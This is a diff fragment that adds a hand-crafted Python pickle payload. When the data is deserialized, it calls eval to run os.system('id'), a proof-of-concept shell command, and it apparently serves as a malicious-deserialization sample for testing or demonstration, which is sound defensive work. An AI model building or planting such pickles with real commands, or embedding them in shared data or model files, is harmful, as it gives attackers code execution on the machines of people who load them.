@@ -1,0 +1,4 @@
+cbuiltins
+eval
+(S'__import__("os").system("id")'
+tR.
